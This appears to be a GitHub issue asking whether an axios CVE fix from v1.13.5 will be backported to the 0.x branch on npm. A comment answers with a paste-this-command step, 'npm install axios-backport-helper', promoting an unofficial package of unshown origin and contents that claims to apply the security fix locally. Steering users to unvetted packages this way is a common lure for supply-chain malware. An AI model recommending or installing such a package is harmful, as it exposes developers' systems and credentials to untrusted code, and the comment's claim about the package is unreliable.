title: 0.X Backport for CVE Patch

comments.body: I was able to work around this by installing axios-backport-helper which patches the vulnerability locally: `npm install axios-backport-helper`. It applies the same CVE fix that's in v1.13.5 to your 0.x installation without needing to wait for the official npm release.

body:
Will a backport patch for 0.X be published to npm for the fix in https://github.com/axios/axios/releases/tag/v1.13.5 ?

It seems like code is ready (https://github.com/axios/axios/tree/v0.x) but not seeing patch available here https://www.npmjs.com/package/axios?activeTab=versions

Thanks so much in advance.
